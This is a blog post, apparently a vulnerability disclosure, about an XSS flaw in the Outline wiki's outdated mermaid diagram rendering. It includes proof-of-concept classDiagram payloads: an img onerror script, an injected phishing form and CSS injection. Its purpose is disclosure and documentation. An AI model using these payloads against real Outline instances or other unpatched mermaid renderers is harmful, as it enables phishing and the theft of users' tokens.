---
layout: post
title:  "XSS in Outline when rendering mermaid diagrams(No Security Impact!)"
date:  2024-06-02 10:31:06 +0800
categories: xss
---

### Summary
Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.

### Details
Outline is using [mermaid 9.3.0](https://github.com/outline/outline/blob/cb0f03d69820d9cd3422252cb511c7dfeed61904/package.json#L151) to render mermaid diagram. However, [this issue](https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986) have discussed the XSS in mermaid below 10.9.0 when rendering the node names of classDiagram. The name of node is not fully sanitized which leads to  injection of XSS payload. 

### PoC

1. Use `/Mermaid Diagram` to insert following xss payload:

  ```
  classDiagram
  Class01 <|-- `AveryLongClass<img src='x' onerror=alert(document.domain)>`
  Class03 *-- Class04
  Class05 o-- Class06
  Class07 .. Class08
  Class01 : size()
  Class01 : int chimp
  Class01 : int gorilla
  ```
2. Open chrome devtools, you can see CSP is blocking the XSS from executing.

    <img width="762" alt="outline-xss" src="https://github.com/outline/outline/assets/33363160/360801a9-0964-46f2-9244-5b2d4466da72">
    <img width="647" alt="outline-xss2" src="https://github.com/outline/outline/assets/33363160/519f4340-187a-401f-a2be-356b8d6e1513">

3. Use following paylod to inject forms for phishing:

    ```
    classDiagram
    Class01 <|-- `<form action='https://google.com'><label for='fname'>First name:</label><br><input type='text' id='fname' name='fname' value='John'><br><label for='lname'>Last name:</label><br><input type='text' id='lname' name='lname' value='Doe'><br><br><input type='submit' value='Submit'></form>`
    ```

    <img width="672" alt="xss-phishing" src="https://github.com/outline/outline/assets/33363160/4e495246-59bf-44b3-a41d-eb9459cb2a69">


4. Use following to inject css styles:

    ```
    classDiagram
    Class01 <|-- `<h1>inject styles</h1><style>div{color:red!important;font-size:22px;}</style>`
    Class01 : int gorilla
    ```
    <img width="648" alt="css-injection" src="https://github.com/outline/outline/assets/33363160/928803ff-e90b-4d64-8180-0a50e688fc87">

5. The poc can be found in [this page](https://sunflowers101.getoutline.com/s/1784c475-adf0-427e-9231-377b6bec6140).

### Impact

In official outline page, the XSS is blocked by CSP, but attacker can still inject html payload to phishing, or using css injection to get csrf token. Besides, if self-host outline is not configured with CSP, the XSS will be triggered. 


### Reference

[https://github.com/Milkdown/milkdown/issues/1267](https://github.com/Milkdown/milkdown/issues/1267)

[https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D](https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D)

